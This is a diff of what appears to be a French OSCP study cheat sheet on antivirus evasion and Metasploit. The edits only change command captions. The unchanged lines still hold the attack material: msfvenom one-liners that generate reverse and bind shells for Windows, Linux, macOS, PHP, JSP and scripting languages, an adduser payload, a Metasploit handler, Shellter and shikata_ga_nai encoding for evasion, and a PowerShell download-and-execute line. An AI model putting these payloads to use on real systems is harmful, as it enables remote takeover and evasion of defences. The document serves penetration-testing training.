@@ -16,7 +16,7 @@ Examiner les entrées et les réponses de l'application web.
 ### Payload
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f powershell -v sc
@@ -26,7 +26,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f powershell -v s
 ### Script
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Script ».</p>
+<p class="oscp-command-note">Script PowerShell dans la rubrique « Script ».</p>
 
 ```powershell
 # Import necessary functions from kernel32.dll and msvcrt.dll
@@ -70,7 +70,7 @@ while ($true) {
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil __version__.</p>
+<p class="oscp-command-note">Script Python lié à « Script ».</p>
 
 ```python
 #!/usr/bin/env python
@@ -143,28 +143,28 @@ if __name__ == "__main__":
 ## Shellter (Automatic Tool)
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil apt-cache.</p>
+
 
 ```text
 apt-cache search shellter && sudo apt install shellter
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil apt.</p>
+<p class="oscp-command-note">Gérer les paquets Debian/Ubuntu.</p>
 
 ```bash
 sudo apt install wine
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil dpkg.</p>
+<p class="oscp-command-note">Examiner ou gérer les paquets installés.</p>
 
 ```text
 dpkg --add-architecture i386 && apt-get update && apt-get install wine32
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfconsole.</p>
+<p class="oscp-command-note">Ouvrir la console Metasploit.</p>
 
 ```text
 msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST [IP];set LPORT [PORT];run;"
@@ -174,7 +174,7 @@ msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse
 ## Metasploit
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfdb.</p>
+
 
 ```bash
 sudo msfdb init
@@ -183,28 +183,28 @@ sudo msfconsole
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil workspace.</p>
+
 
 ```text
 workspace -a [nameToGive]
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil search.</p>
+
 
 ```text
 search type:auxiliary smb
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil services.</p>
+
 
 ```text
 services -p 445 --rhosts
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>
 
 ```bash
 # Show available payloads
@@ -221,7 +221,7 @@ msfvenom -p [PAYLOAD] -e [ENCODER] -f [FORMAT] -i [ENCODE] [COUNT_OF_ENCODING] L
 ### Listeners
 
 
-<p class="oscp-command-note">Tester ou établir une connexion réseau avec Netcat.</p>
+<p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>
 
 ```bash
 # Using Netcat, for NON-Stage payloads ONLY.
@@ -242,7 +242,7 @@ msf>exploit -j
 ### Main Payloads
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>
 
 ```bash
 # Linux
@@ -294,7 +294,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.wa
 **msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>
 
 ```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
@@ -304,7 +304,7 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell
 **msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+
 
 ```bash
 msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
@@ -314,7 +314,7 @@ msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.el
 **msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+
 
 ```bash
 msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
@@ -324,7 +324,7 @@ msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
 **msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+
 
 ```bash
 msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
@@ -334,7 +334,7 @@ msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
 **msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
@@ -349,7 +349,7 @@ msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="
 **msfvenom -p windows/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f exe > shell.exe**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+
 
 ```bash
 msfvenom -p windows/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f exe > shell.exe
@@ -359,7 +359,7 @@ msfvenom -p windows/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f exe > shell.exe
 **msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+
 
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
@@ -369,7 +369,7 @@ msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
 **msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
@@ -379,7 +379,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
 **msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+
 
 ```bash
 msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
@@ -389,7 +389,7 @@ msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
 **msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+
 
 ```bash
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho
@@ -399,7 +399,7 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho
 **msfvenom -p osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho > shell.macho**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+
 
 ```bash
 msfvenom -p osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho > shell.macho
@@ -409,7 +409,7 @@ msfvenom -p osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho > shell.macho
 **msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+
 
 ```bash
 msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py
@@ -419,7 +419,7 @@ msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py
 **msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+
 
 ```bash
 msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh
@@ -429,7 +429,7 @@ msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh
 **msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw > shell.pl**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+
 
 ```bash
 msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw > shell.pl
@@ -439,7 +439,7 @@ msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw > shell.pl
 **msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp
@@ -449,7 +449,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.a
 **msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+
 
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp
@@ -459,7 +459,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp
 **msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+
 
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war
@@ -469,7 +469,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war
 **msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php cat shell.php**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+
 
 ```bash
 msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php cat shell.php
@@ -479,7 +479,7 @@ msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php c
 **msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > phpreverseshell.php**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+
 
 ```bash
 msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > phpreverseshell.php
@@ -494,7 +494,7 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Obj
 **msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x04\xA0"**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x04\xA0"
@@ -504,7 +504,7 @@ msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c 
 **msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/fnstenv_mov -b "\x04\xA0"**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
+
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/fnstenv_mov -b "\x04\xA0"
